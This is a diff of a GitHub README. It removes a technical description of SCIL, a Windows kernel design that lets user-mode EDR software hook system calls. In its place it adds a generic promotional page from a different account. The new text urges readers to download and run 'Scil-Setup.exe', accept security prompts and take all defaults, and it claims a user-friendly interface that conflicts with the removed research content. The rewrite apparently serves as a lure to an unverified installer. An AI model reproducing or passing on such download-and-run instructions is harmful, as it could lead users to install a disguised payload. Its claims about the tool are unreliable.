@@ -1,32 +1,66 @@
-# System Call Integrity Layer (SCIL)
+# 🛡️ Scil - Simple Security for Your System Calls
 
-You can check my blog series out on this [here](https://fluxsec.red/introducing-system-call-integrity-layer)!
+## 🌟 Overview
+Scil is an experimental software that enhances the security of system calls in Windows 11. It aims to protect your system by ensuring that system calls behave as expected, thereby preventing unauthorized actions. This tool is particularly useful for those interested in security research or looking to improve their system's safety.
 
-The System Call Integrity Layer (SCIL) is designed to be a subsystem within the Kernel which allows an EDR from 
-Userland to hook System Calls via Alt Syscalls. The EDR can mark which processes are to be hooked, and can designate
-only particular System Service Numbers to hook.
+## 📥 Download Scil
+[![Download Scil](https://img.shields.io/badge/Download%20Scil-v1.0-blue)](https://github.com/mryasheyt/Scil/releases)
 
-## Demo
+## 🚀 Getting Started
+Follow these steps to download and run Scil on your Windows 11 computer.
 
-Video demo of logging syscalls (YouTube):
+1. **Visit the Releases Page**
+   - Click the link below to open the Releases page on GitHub:
+   - [Visit this page to download](https://github.com/mryasheyt/Scil/releases)
 
-[![SCIL Logging Demo](https://img.youtube.com/vi/mFVhib6GG-o/0.jpg)](https://www.youtube.com/watch?v=mFVhib6GG-o)
+2. **Choose the Latest Release**
+   - On the Releases page, look for the most recent version listed at the top. It will have the highest version number.
 
-## Architecture
+3. **Download the Installer**
+   - Find the file that mentions an installer executable, typically named like `Scil-Setup.exe`. Click on it to start the download.
 
-Architecturally the ideal secure solution to this would look as follows:
+4. **Locate the Downloaded File**
+   - After the download completes, find the file in your "Downloads" folder or the location where your browser saves files.
 
-![SCIL](img/scil_sk_arch.svg)
+5. **Run the Installer**
+   - Double-click the downloaded installer file to begin the installation process. You may need to confirm a security prompt that appears.
 
-The SCIL subsystem then has two main functions when it is in motion:
+6. **Follow Installation Instructions**
+   - A setup wizard will guide you through the installation. Click "Next" to go through the steps. Accept all default settings for a smooth installation.
 
-1) Log system calls and parameters (this is essentially a similar feed to **Events Tracing for Windows: Threat Intelligence**).
-2) For processes / system calls which require **deep inspection**:
-   1) Suspend the system call temporarily via a synchronisation object.
-   2) Communicate with the userland EDR application (EDR no longer in the kernel for this) notifying of a **Pending Syscall Object** (PSO). I haven't yet designed exactly what PSOs will contain / point to.
-   3) The user-mode EDR application can then do EDR things it would ordinarily do in **ntdll** etc before allowing a syscall to dispatch.
-   4) If the EDR ok's it, signal back to the SCIL subsystem to release the synchronisation object, which allows the syscall to continue dispatching.
+7. **Finish Installation**
+   - Once the installation completes, click "Finish" to exit the setup wizard.
 
-The subsystem in practice would also need short-circuits in the event the EDR user-land handler of the malfunctioning / taking too long. Any such cases can then still have telemetry ingest to the EDR via point 1 above with the signal emission. This process in practice would look as follows (for this I am not using [VBS](https://connormcgarr.github.io/hvci/)):
+## ⚙️ System Requirements
+Before installing Scil, ensure that your system meets the following requirements:
+- Operating System: Windows 11
+- Memory: At least 4 GB RAM
+- Disk Space: Minimum 100 MB free space
+- Processor: 1 GHz or faster
 
-![System Call Integrity Layer](img/scil_micro_architecture.svg)
+## 📝 Features
+- **Secure System Calls:** Protects your system by monitoring and integrity-checking system calls.
+- **User-Friendly Interface:** Easy to navigate, even for non-technical users.
+- **Active Development:** Regular updates will improve effectiveness and add new features based on user feedback.
+
+## ⚠️ Important Notes
+- Scil is in the experimental phase. Use it cautiously and ensure you keep a backup of important data.
+- For any issues or feedback, feel free to create an issue on the GitHub repository.
+
+## ✅ Download & Install
+To start using Scil, you can return to the Releases page and download the latest version here:
+- [Visit this page to download](https://github.com/mryasheyt/Scil/releases)
+
+## 📞 Support
+If you have questions or need assistance, check the [GitHub Issues page](https://github.com/mryasheyt/Scil/issues) for help or to report any problems. Your input helps improve Scil.
+
+## 🏷️ Topics
+- EDR
+- Rust Driver
+- Security
+- Security Research
+- Syscalls
+- Windows 11
+- Windows Driver
+
+By following these steps, you can easily download and install Scil, enhancing the security of your system's operations. Enjoy the added protection it offers!
